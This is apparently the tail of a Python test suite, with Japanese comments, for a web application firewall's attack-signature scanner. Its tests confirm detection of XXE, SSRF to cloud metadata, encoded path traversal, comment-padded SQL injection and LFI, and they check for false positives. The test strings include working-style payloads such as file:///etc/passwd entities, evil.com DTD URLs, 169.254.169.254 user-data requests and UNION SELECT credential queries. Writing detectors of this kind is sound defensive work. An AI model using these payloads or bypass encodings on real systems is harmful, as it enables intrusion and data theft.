    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    xxe = dict(_SIG_RE)["xxe"]
    assert xxe.search(_normalize_for_scan(
        '<!DOCTYPE foo PUBLIC "-//X//DTD X//EN" "http://evil.com/x.dtd">')), "PUBLIC external id"
    # 既存の ENTITY/SYSTEM 形は回帰なし
    assert xxe.search(_normalize_for_scan('d=<!ENTITY xxe SYSTEM "file:///etc/passwd">'))
    assert xxe.search(_normalize_for_scan('y=<!DOCTYPE foo SYSTEM "http://evil/x.dtd">'))
    # 誤検知なし: 引用符を伴わない良性 <!doctype html>
    assert not xxe.search(_normalize_for_scan("<!doctype html>"))


def test_b5_ssrf_decimal_hex_imds_and_expanded_paths_is_caught():
    # ライブ監査で実証: IMDS IP(169.254.169.254)の10進(2852039166)/16進(0xa9fea9fe)表記は
    # 同一ホストへ解決されるがバイパスされていた。誤検知回避のため URL authority 位置
    # (:// または @ の直後)限定。/latest/dynamic・/latest/user-data パスも追加。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    ssrf = dict(_SIG_RE)["ssrf"]
    assert ssrf.search(_normalize_for_scan(
        "url=http://2852039166/latest/dynamic/instance-identity/document")), "decimal IMDS"
    assert ssrf.search(_normalize_for_scan("url=http://0xa9fea9fe/latest/meta-data/")), "hex IMDS"
    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/dynamic")), "dynamic path no trailing slash"
    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/user-data")), "user-data path"
    # 既存の真陽性は回帰なし
    assert ssrf.search(_normalize_for_scan("url=http://169.254.169.254/latest/meta-data/iam/"))
    # 誤検知なし: 位置ゲート外の裸の大数値(注文合計/タイムスタンプ等によくある)
    for s in ["total=2852039166", "ts=0xa9fea9fe", "id=2852039166abc"]:
        assert not ssrf.search(_normalize_for_scan(s)), s


def test_b6_triple_encoded_traversal_is_decoded_and_caught():
    # ライブ監査で実証: 旧デコード予算は2回固定で、三重(以上)エンコードされた ".." は
    # 実体の "." まで戻らずtraversalが素通りしていた(ハードコード標的以外は特に)。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, NetShield
    triple_dots = "%25252e%25252e"                 # ".." の三重%エンコード
    b = _normalize_for_scan(f"f={triple_dots}/{triple_dots}/etc/passwd")
    assert ".." in b, b                             # 3回のデコードで実体の .. まで戻る
    # 通常(0〜1回で復号完了)の入力は従来どおり即抜け=低速化しない
    assert _normalize_for_scan("f=../../etc/passwd") == _normalize_for_scan(
        "f=%2e%2e/%2e%2e/etc/passwd")
    # end-to-end: ハードコードされていない標的でも(ハニーポット/固定リテラルに依らず)
    # traversal シグネチャが発火する(2階層以上のトラバーサルという F5 の要件も満たす形で)。
    triple_traversal = "%25252e%25252e%2f%25252e%25252e%2fapp%2fsecret_config.yml"
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        d = sh.inspect("198.51.100.40", path="/", query="f=" + triple_traversal)
        assert "traversal" in (d.get("reason") or ""), d


def test_b7_sql_comment_stripping_dotall_and_bound_widened_bypass_is_caught():
    # 深掘りSQLi監査で実証: 一般/版付きコメント除去 regex が (1) DOTALL 無しで '.' が実改行に
    # マッチせず、CRLF→';' 正規化(より後段)より前の複数行コメント(UNION/*\n*/SELECT。実DBで
    # 有効な "UNION SELECT")を認識できず、(2) 境界 {0,200}? が200文字を超えるコメント本体
    # (パディング攻撃)で不成立になり、いずれの場合もコメントが未除去のまま残って
    # union/select・drop/table・waitfor/delay 等の隣接要求(\s(;]*等)を破っていた。
    # 実装検証: real SQLite で UNION/*<300文字埋め>*/SELECT は実際に有効なSQLとして実行される
    # (=本物の攻撃)ことを確認済み(コメントは常にトークン区切りとして働くのみで、
    # SEL/**/ECT のようなキーワード内分割は逆に実DBで再結合されない=無害。後者は意図的に
    # 未対応のまま=対応すると新規誤検知/過剰な複雑化のリスクが高くベンチマークにも合わない)。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    # (1) 実改行を含む複数行コメント(DOTALL 欠如で旧実装は素通り)
    assert rgx["sqli"].search(_normalize_for_scan("1' UNION/*\n*/SELECT username,password FROM users--")), \
        "multi-line comment UNION/*\\n*/SELECT"
    # (2) 200文字超のコメント本体(境界の有界lazy quantifierが不成立になっていた)
    filler = "A" * 300
    assert rgx["sqli"].search(_normalize_for_scan(
        f"1' UNION/*{filler}*/SELECT username,password FROM users--")), "oversized comment UNION..SELECT"
    assert rgx["sqli"].search(_normalize_for_scan(
        f"1'; DROP/*{filler}*/TABLE users--")), "oversized comment DROP..TABLE"
    assert rgx["sqli_blind"].search(_normalize_for_scan(
        f"1'; WAITFOR/*{filler}*/DELAY '0:0:5'--")), "oversized comment WAITFOR..DELAY"
    # 既存の真陽性(短い/一行コメント・versioned comment 丸ごとラップ)は回帰なし
    assert rgx["sqli"].search(_normalize_for_scan("1' UNION/**/SELECT username,password FROM users--"))
    assert rgx["sqli"].search(_normalize_for_scan("1' UNION/*!50000SELECT*/username,password FROM users--"))
    assert rgx["sqli"].search(_normalize_for_scan("1' UNION SELECT username,password FROM users--"))
    # 誤検知なし: コメントを含む良性テキスト(ミニファイ済CSS/JS片の貼り付け等によくある形)
    assert not rgx["sqli"].search(_normalize_for_scan(
        "note: /* TODO refactor later */ this widget needs a redesign"))
    assert not rgx["sqli"].search(_normalize_for_scan(
        "body{color:red}/*header style*/.header{margin:0}"))
    # プレフィルタがこの新規キャッチを取りこぼさない(needle は既存の union/select/drop table/
    # waitfor がそのまま使えるので accel.py の変更は不要=スーパーセット維持を確認)
    import dataplane.engine.core.accel as accel
    for s in [f"1' UNION/*{filler}*/SELECT username,password FROM users--",
              "1' UNION/*\n*/SELECT username,password FROM users--"]:
        b = _normalize_for_scan(s)
        assert accel.prescan_suspicious(b.encode("utf-8")) > 0, s


def test_f1_scanner_ua_is_scoped_to_user_agent_field_only():
    # ライブ監査で実証したFP: scanner_ua は本来UA文字列の識別が目的なのに、汎用走査面
    # (path+query+UA混成/本文)全体に対して判定していたため、bio欄の自由記述
    # (「nmapやsqlmapに詳しい」等)だけで即403級のスコアが付いていた。
    import tempfile
    from dataplane.engine.lifeform.pipeline import NetShield
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        # bio欄(query経由)の自由記述はscanner_uaとして扱わない=無スコア
        d = sh.inspect("203.0.113.10", path="/profile",
                       query="bio=I'm a penetration tester experienced with nmap, "
                             "nikto, and sqlmap for security testing")
        assert d.get("action") == "allow" and float(d.get("score") or 0) == 0.0, d
        # 本文(body)経由の同様の自由記述もscanner_uaとして扱わない
        d2 = sh.inspect_body("203.0.113.12",
                             b"bio=I run nmap and sqlmap daily as part of my job")
        assert d2.get("action") == "allow", d2
    # 実際の User-Agent 経由なら引き続き検知(回帰なし=本来のスコープは維持)
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        d = sh.inspect("203.0.113.11", path="/", user_agent="sqlmap/1.7")
        assert "scanner_ua" in (d.get("reason") or ""), d


def test_f8_sensitive_path_is_scoped_to_path_field_only():
    # ライブ監査で実証したFP: sensitive_path は本来「要求されたパスそのもの」が意味を持つのに、
    # query等の自由記述内の言及(バグ報告「/wp-login.phpにアクセスできない」等)まで拾っていた。
    import tempfile
    from dataplane.engine.lifeform.pipeline import NetShield
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        d = sh.inspect("203.0.113.20", path="/support",
                       query="msg=I can't access /wp-login.php on my site anymore, "
                             "getting a 500 error")
        assert "sensitive_path" not in (d.get("reason") or ""), d
    # 実際の path 経由なら引き続き検知(回帰なし)
    with tempfile.TemporaryDirectory() as tmp:
        sh = NetShield(state_dir=tmp); sh.enable()
        d = sh.inspect("203.0.113.21", path="/wp-login.php")
        assert "sensitive_path" in (d.get("reason") or ""), d


def test_f4_information_schema_requires_schema_qualified_reference():
    # ライブ監査で実証したFP: sqli_blind の information_schema は単発の地の文言及
    # (「information_schemaを調べたい」)でも発火していた。実SQLiは常にドット修飾で使う
    # (information_schema.tables 等)ため、それを要求して誤検知を除く。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    sqli_blind = dict(_SIG_RE)["sqli_blind"]
    assert not sqli_blind.search(_normalize_for_scan(
        "I need help querying information_schema to find all tables "
        "with a column named user_id")), "bare mention should not match"
    # 実攻撃(ドット修飾参照)は回帰なし
    for s in ["' AND (SELECT 1 FROM information_schema.tables LIMIT 1)--",
              "union select 1 from information_schema.tables",
              "1 and 1=(select count(*) from information_schema.columns)"]:
        assert sqli_blind.search(_normalize_for_scan(s)), s


def test_f5_traversal_requires_multi_hop_or_hardcoded_target():
    # ライブ監査で実証したFP: traversal の ../ / ..\ は単発の地の文相対パス言及
    # (「..\shared\exports\report.csv relative to project root」)でも発火していた。
    # 実攻撃はほぼ常に複数階層を遡る(../../../../etc/passwd 等)ため2回以上の反復を要求する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    traversal = dict(_SIG_RE)["traversal"]
    assert not traversal.search(_normalize_for_scan(
        "The export is at ..\\shared\\exports\\report.csv relative to the project root"
    )), "single-hop prose mention should not match"
    assert not traversal.search(_normalize_for_scan(
        "See ../docs/readme.md for details")), "single-hop unix prose mention should not match"
    # 実攻撃(多段トラバーサル)は回帰なし
    for s in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
              "../../etc/passwd", "..\\..\\windows\\system.ini"]:
        assert traversal.search(_normalize_for_scan(s)), s
    # ハードコード標的リテラル(/etc/passwd 等)は単発の ../ でも従来どおり検知(別分岐で担保)
    assert traversal.search(_normalize_for_scan("f=/etc/shadow"))


def test_f6_lfi_file_scheme_requires_parameter_value_position():
    # ライブ監査で実証したFP: lfi の file:// は他スキーム(gopher/dict/expect/phar/netdoc)と
    # 違い、地の文のファイル共有リンク言及で非常に頻繁に出る。パラメータ値位置(= の直後)
    # 限定にして、地の文言及を除きつつ ?url=file://... 型の実攻撃は捕捉する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    lfi = dict(_SIG_RE)["lfi"]
    assert not lfi.search(_normalize_for_scan(
        "Here's the doc: file://fileserver01/shared/reports/q3_summary.pdf"
    )), "prose file share mention should not match"
    # 実攻撃(パラメータ値位置)は回帰なし
    assert lfi.search(_normalize_for_scan("url=file:///etc/passwd"))
    assert lfi.search(_normalize_for_scan("?target=file://evil/x"))
    # 他スキームは無条件のまま(=絞り込みの影響を受けない)
    for s in ["url=gopher://127.0.0.1:6379", "x=dict://h:11211", "x=phar://a",
              "x=expect://id", "x=netdoc:///etc/passwd", "file=php://filter/resource=x"]:
        assert lfi.search(_normalize_for_scan(s)), s


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    ok = 0
    for fn in fns:
        try:
            fn()
            ok += 1
            print("PASS", fn.__name__)
        except Exception as e:
            print("FAIL", fn.__name__, "->", repr(e))
    print(f"--- {ok}/{len(fns)} passed ---")
